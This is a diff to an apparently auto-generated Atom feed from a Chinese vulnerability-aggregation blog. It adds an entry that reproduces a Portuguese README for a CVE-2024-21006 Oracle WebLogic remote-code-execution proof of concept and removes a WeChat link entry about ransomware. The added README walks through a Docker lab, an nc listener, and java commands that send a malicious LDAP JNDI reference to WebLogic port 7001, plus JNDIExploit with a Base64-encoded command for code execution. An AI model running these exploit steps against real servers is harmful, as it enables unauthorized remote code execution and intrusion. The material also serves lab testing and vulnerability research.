@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-06T22:00:19.013Z</updated>
+  <updated>2025-06-07T00:15:13.823Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Oracle WebLogic Server Remote Code Execution Vulnerability</title>
+    <link href="http://example.com/2025/06/07/github_1726701690/"/>
+    <id>http://example.com/2025/06/07/github_1726701690/</id>
+    <published>2025-06-07T00:15:13.828Z</published>
+    <updated>2025-06-07T00:15:13.823Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Oracle WebLogic Server Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-21006</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2024-21006是一个影响Oracle WebLogic Server的远程代码执行（RCE）严重漏洞。该漏洞与不安全的IIOP（Internet Inter-ORB Protocol）和JNDI（Java Naming and Directory Interface）协议使用有关，允许未经认证的远程攻击者通过恶意的JNDI引用在受影响的服务器上执行任意代码。</p><p><strong>产品厂商：</strong> Oracle</p><p><strong>产品名称：</strong> WebLogic Server</p><p><strong>来源：</strong> <a href="https://github.com/d3fudd/CVE-2024-21006_POC">https://github.com/d3fudd/CVE-2024-21006_POC</a></p><p><strong>类型：</strong> CVE-2024:github search</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br># CVE-2024-21006 PoC<br><br>A CVE-2024-21006 é uma vulnerabilidade de Remote Code Execution (RCE) crítica que afeta o Oracle WebLogic Server. A falha está relacionada ao uso inseguro do protocolo IIOP (Internet Inter-ORB Protocol) e JNDI (Java Naming and Directory Interface), permitindo que um invasor remoto não autenticado execute código arbitrário no servidor afetado, por meio de uma referência maliciosa JNDI.<br><br>## Como executar (Lab <span class="hljs-code">+ Kali +</span> exploit):<br><br>Monte o ambiente:<br>\`\`\`<br>docker-compose up -d<br>\`\`\`<br><br>Para acessar Shell do Kali:<br>\`\`\`<br>docker exec -it cve-2024-21006_poc-kali-1 /bin/bash<br>\`\`\`<br><br>Para acessar Shell do Weblogic:<br>\`\`\`<br>docker exec -it cve-2024-21006_poc-weblogic-1 /bin/bash<br>\`\`\`<br><br>Para acessar Shell do ExploitBox:<br>\`\`\`<br>docker exec -it exploitbox /bin/bash<br>\`\`\`<br><br>## Explorando Lab<br><br>### PoC simples:<br><br>No Kali:<br>\`\`\`<br>nc -vnlp 1389<br>\`\`\`<br><br>No ExploitBox:<br>\`\`\`<br>java -jar CVE-2024-21006.jar &lt;IP do Weblogic&gt; 7001 ldap://&lt;IP do Kali&gt;:1389<br>\`\`\`<br><br>Veja que o Kali recebeu a conexão vinda do Weblogic<br><br>![](./image/03.png)<br><br>### Obtendo RCE:<br><br>No Kali, inicie o JNDIExploit:<br>\`\`\`<br>cd /exploit<br>\`\`\`<br>\`\`\`<br>java \<br>--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \<br>--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \<br>--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \<br>--add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \<br>-jar JNDIExploit/JNDIExploit-1.3-SNAPSHOT.jar -i &lt;IP do Kali&gt;<br>\`\`\`<br>![](./image/04.png)<br><br>No ExploitBox, execute o exploit:<br>\`\`\`<br>java -jar CVE-2024-21006.jar &lt;IP do Weblogic&gt; 7001 &quot;ldap://&lt;IP do Kali&gt;:1389/Basic/Command/Base64/&lt;Comando em Base64&gt;&quot;<br>\`\`\`<br>![](./image/05.png)<br><br>No Kali, veja que recebemos o request:<br><br>![](./image/06.png)<br><br>No Weblogic, veja que o comando foi executado e o arquivo foi criado com sucesso:<br><br>![](./image/07.png)<br><br>## Referências:<br><span class="hljs-bullet">- </span>https://github.com/lightr3d/CVE-2024-21006<span class="hljs-emphasis">_jar</span><br><span class="hljs-emphasis">- https://github.com/momika233/CVE-2024-21006</span><br><span class="hljs-emphasis">- https://blog.csdn.net/zwy15288408160/article/details/138189146</span><br><span class="hljs-emphasis">- https://blog.csdn.net/m0_</span>46109609/article/details/114373594<br><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>CVE-2024-21006.jar<br><span class="hljs-bullet">- </span>Dockerfile<br><span class="hljs-bullet">- </span>JNDIExploit<br><span class="hljs-bullet">- </span>README.md<br><span class="hljs-bullet">- </span>docker-compose.yml<br><span class="hljs-bullet">- </span>image<br><span class="hljs-bullet">- </span>lib<br><span class="hljs-bullet">- </span>src<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Oracle WebLogic Server Remote Code Execution Vulnerability&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
+    
+  </entry>
   
   <entry>
     <title>Microsoft Windows Cross Device Service Elevation of Privilege Vulnerability</title>
@@ -552,33 +581,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/41igQGH8SAamQhOfDX6Pjw&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【深度好文】勒索软件攻击生命周期运行分析</title>
-    <link href="http://example.com/2025/06/06/weixin_3161792675/"/>
-    <id>http://example.com/2025/06/06/weixin_3161792675/</id>
-    <published>2025-06-06T05:58:36.013Z</published>
-    <updated>2025-06-06T05:58:36.009Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/5XDD9590lD-XG3AQ0J2-1w">https://mp.weixin.qq.com/s/5XDD9590lD-XG3AQ0J2-1w</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/5XDD9590lD-XG3AQ0J2-1w&quot;&gt;https://mp.weixin.qq.c</summary>
       
     
     
